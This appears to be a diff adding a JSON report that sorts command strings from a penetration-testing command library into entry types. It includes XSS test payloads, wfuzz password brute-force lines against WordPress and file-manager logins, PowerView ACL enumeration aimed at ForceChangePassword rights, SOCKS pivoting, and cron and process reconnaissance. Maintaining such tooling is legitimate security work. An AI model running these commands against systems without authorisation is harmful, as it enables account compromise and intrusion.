+        "text": "SOCKS proxy running: ssh -D or ssh -R (remote dynamic)",
+        "count": 1,
+        "category": "state_condition",
+        "action": "CREATE_VERIFY_CMD",
+        "preservation_note": "Create verification/check command",
+        "suggested_id": "socks-proxy-running",
+        "sample_file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "payload_commands": [
+      {
+        "text": "<svg onload=alert(1)>",
+        "count": 1,
+        "category": "payload_html",
+        "action": "CREATE_PAYLOAD_CMD",
+        "preservation_note": "Create XSS test command with payload in command field",
+        "suggested_id": "xss-test-svg-onload",
+        "sample_file": "data/commands/web/general.json"
+      },
+      {
+        "text": "<body onload=alert(1)>",
+        "count": 1,
+        "category": "payload_html",
+        "action": "CREATE_PAYLOAD_CMD",
+        "preservation_note": "Create XSS test command with payload in command field",
+        "suggested_id": "xss-test-body-onload",
+        "sample_file": "data/commands/web/general.json"
+      }
+    ],
+    "tool_commands": [
+      {
+        "text": "nessus scan",
+        "count": 1,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "nessus-scan",
+        "sample_file": "data/commands/recon.json"
+      },
+      {
+        "text": "burp intruder",
+        "count": 2,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "burp-intruder",
+        "sample_file": "data/commands/web/general.json"
+      },
+      {
+        "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+        "count": 1,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "wfuzz-z-file",
+        "sample_file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "wpscan-enumerate-all (to discover usernames)",
+        "count": 1,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "wpscan-enumerate-all",
+        "sample_file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "burp suite XML-RPC plugin",
+        "count": 1,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "burp-suite-xml",
+        "sample_file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "wfuzz -c -z file,<WORDLIST> -d \"fm_usr=<USER>&fm_pwd=FUZZ\" --hs \"<FAIL_STRING>\" http://<TARGET>/<PAGE>",
+        "count": 1,
+        "category": "tool_with_action",
+        "action": "CREATE_TOOL_CMD",
+        "preservation_note": "Create command for tool with action",
+        "suggested_id": "wfuzz-c-z",
+        "sample_file": "data/commands/enumeration/password-attacks-hydra.json"
+      }
+    ],
+    "extract_commands": [
+      {
+        "text": "Manual check with: sc qc <servicename>",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "manual-check-with",
+        "sample_file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Check nmap version: nmap --version (if < 5.21, interactive works)",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "check-nmap-version",
+        "sample_file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "Manual binary analysis: strings /path/to/binary",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "manual-binary-analysis",
+        "sample_file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "Check specific binary: getcap /usr/bin/python3 (test known binary)",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "check-specific-binary",
+        "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "manual-check-look",
+        "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "manual-attribute-inspection",
+        "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "import-powerview",
+        "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "check-for-allextendedrights",
+        "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "manual-enumeration-get",
+        "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Check robots.txt first: curl http://<TARGET>/robots.txt",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "check-robots-txt",
+        "sample_file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check for rate limiting: Test with small wordlist first",
+        "count": 1,
+        "category": "instruction_with_cmd",
+        "action": "EXTRACT_COMMAND",
+        "preservation_note": "Extract embedded command and create entry",
+        "suggested_id": "check-for-rate",
+        "sample_file": "data/commands/exploitation/general.json"
+      }
+    ],
+    "full_syntax_commands": [
+      {
+        "text": "curl -s <URL>/feed/ | grep generator",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "curl-s-url",
+        "sample_file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "cat /proc/*/cmdline | tr '\\0' ' '",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "cat-proc-cmdline",
+        "sample_file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PATTERN>",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "ps-aux-grep",
+        "sample_file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PROCESS_NAME> | awk '{print $2}'",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "ps-aux-grep",
+        "sample_file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /proc/<PID>/cmdline | tr '\\0' ' '",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "cat-proc-pid",
+        "sample_file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /var/spool/cron/crontabs/<USERNAME>",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "cat-var-spool",
+        "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "less /etc/crontab",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "less-etc-crontab",
+        "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "find /etc/cron* -type f",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "find-etc-cron",
+        "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "at (command-line AT utility)",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "at-command-line",
+        "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "ls -la /var/spool/at/",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "ls-la-var",
+        "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "tail-follow-log /var/log/syslog",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "tail-follow-log",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -k (kernel messages via journald)",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "journalctl-k-kernel",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -kf (kernel messages via journald)",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "journalctl-kf-kernel",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -u ssh | grep -i failed",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "journalctl-u-ssh",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep sudo.*COMMAND",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "journalctl-grep-sudo",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep 'Failed password'",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "journalctl-grep-failed",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "dmesg-kernel-messages (kernel only)",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "dmesg-kernel-messages",
+        "sample_file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "ls /etc/init.d/",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "ls-etc-init",
+        "sample_file": "data/commands/monitoring/service-enumeration.json"
+      },
+      {
+        "text": "top -bn1 -o %MEM | head -20",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "top-bn-o",
+        "sample_file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "top -bn1 -o %CPU | head -20",
+        "count": 1,
+        "category": "command_full",
+        "action": "CREATE_FULL_CMD",
+        "preservation_note": "Create complete command entry",
+        "suggested_id": "top-bn-o",
+        "sample_file": "data/commands/monitoring/resource-monitoring.json"
+      }
+    ]
+  }
+}
